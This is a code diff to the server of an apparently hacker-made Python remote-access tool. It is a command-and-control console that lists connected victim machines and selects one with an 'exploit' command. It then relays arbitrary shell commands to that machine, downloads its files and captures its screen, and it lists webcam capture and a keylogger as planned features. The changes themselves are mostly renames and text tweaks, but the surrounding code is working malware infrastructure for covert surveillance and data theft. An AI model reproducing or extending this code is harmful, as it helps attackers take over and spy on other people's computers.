@@ -18,12 +18,13 @@ receive_dir = 'Received/'
 COMMANDS = {'\u001b[33m\u001b[1m\nhelp   ': ['Shows this help'],
             'list   ': ['Lists connected clients'],
             'exploit': ['Selects a client by its index. (ex : exploit 0, exploit 1...)'],
-            'quit   ': ['Stops current connection with a client. To be used when client is selected'],
-            'exit   ': ['Shuts server down and close app'],
+            'quit   ': ['Stops current connection with a client. Use it when client is selected'],
+            'exit   ': ['Shut server down and close app'],
 
             'get    ': ['NEW!!! Downloading files from the client'],
-            'screenshot': ['NEW!!! SCREENSHOT THE CLIENT SCREEN'],
+            'capture': ['NEW!!! SCREENSHOT THE CLIENT SCREEN'],
             'webcam ': ['(Not Added) CAPTURE A PICTURE OF WEBCAM!\u001b[0m\n\n'],
+            'keylogger': ['(Not Added) CAPTURE A PICTURE OF WEBCAM!\u001b[0m\n\n'],
             }
 
 
@@ -54,7 +55,7 @@ class MultiServer(object):
 
         print("\nThe ip to use for client is \u001b[31m%s\u001b[0m. The port is:\u001b[31m %s\u001b[0m" % (
             self.host, self.port))
-        print("\u001b[36m\u001b[1mTo connect to the first client, type \u001b[0m\u001b[36m'exploit 0'\u001b[0m \n")
+        print("\u001b[36m\u001b[1mTo connect to the first client, type\u001b[0m\u001b[36m 'exploit 0' \u001b[0m\n")
         print("\n\u001b[31m\u001b[1mType 'help' to see the list of commands\u001b[0m")
 
     def print_help(self):
@@ -67,7 +68,7 @@ class MultiServer(object):
         signal.signal(signal.SIGTERM, self.quit_gracefully)
         return
 
-    def quit_gracefully(self, signal=None, frame=None):
+    def quit_gracefully(self):
         queue.task_done()
         queue.task_done()
         print('\u001b[31m\u001b[7m\u001b[1mServer shutdown and exit\u001b[0m')
@@ -122,8 +123,8 @@ class MultiServer(object):
             self.all_connections.append(conn)
             self.all_addresses.append(address)
             print(
-                '  \u001b[35m\u001b[1mConnection has been established: {0} ({1})\u001b[0m'.format(address[-1],
-                                                                                                           address[0]))
+                '\n \u001b[35m\u001b[1mConnection has been established | NAME {0} | IP {1}\u001b[0m'.format(address[-1],
+                                                                                                            address[0]))
         return
 
     def start_glama(self):
@@ -164,7 +165,7 @@ class MultiServer(object):
                 self.all_addresses[i][1]) + "\u001b[37m" + '   ' + "\u001b[36m" + str(
                 self.all_addresses[i][2]) + '\u001b[0m\n'
         print(
-            '\n\u001b[31mID\u001b[0m  \u001b[33mIP\u001b[0m           \u001b[35mPORT\u001b[0m    \u001b[36mCLIENT '
+            '\n\u001b[31mID\u001b[0m  \u001b[33mIP\u001b[0m             \u001b[35mPORT\u001b[0m      \u001b[36mCLIENT '
             'NAME\u001b[0m' + '\n\n' + results)
         return
 
@@ -191,15 +192,15 @@ class MultiServer(object):
         """ Read message length and unpack it into an integer
         :param conn:
         """
-        raw_msglen = self.recvall(conn, 4)
-        if not raw_msglen:
+        raw_msg_len = self.recvall(conn, 4)
+        if not raw_msg_len:
             return None
-        msglen = struct.unpack('>I', raw_msglen)[0]
+        msg_len = struct.unpack('>I', raw_msg_len)[0]
         # Read the message data
-        return self.recvall(conn, msglen)
+        return self.recvall(conn, msg_len)
 
     def recvall(self, conn, n):
-        """ Helper function to recv n bytes or return None if EOF is hit
+        """ Helper function to receive n bytes or return None if EOF is hit
         :param n:
         :param conn:
         """
@@ -237,10 +238,10 @@ class MultiServer(object):
         conn.send(str.encode(filename))
         self.download(conn)
 
-    def screenshot(self, conn, cmd):
+    def capture(self, conn, cmd):
         conn.send(str.encode(cmd))
         filename = input("Name of the screenshot: ")
-        conn.send(str.encode('screen_' + filename + '.png'))
+        conn.send(str.encode('capture_' + filename + '.png'))
         self.download(conn)
 
     def send_target_commands(self, target, conn):
@@ -255,7 +256,7 @@ class MultiServer(object):
         while True:
             try:
                 cmd = input()
-                if len(str.encode(cmd)) > 0 and cmd != 'get' and cmd != 'screenshot' and cmd != 'glama help':
+                if len(str.encode(cmd)) > 0 and cmd != 'get' and cmd != 'capture' and cmd != 'glama help':
                     conn.send(str.encode(cmd))
                     cmd_output = self.read_command_output(conn)
                     client_response = str(cmd_output, "utf-8")
@@ -265,8 +266,8 @@ class MultiServer(object):
                 # DOWNLOADING FILES FROM CLIENT
                 if cmd == 'get':
                     self.get(conn, cmd)
-                if cmd == 'screenshot':
-                    self.screenshot(conn, cmd)
+                if cmd == 'capture':
+                    self.capture(conn, cmd)
 
             except Exception as e:
                 print("Connection was lost %s" % str(e))
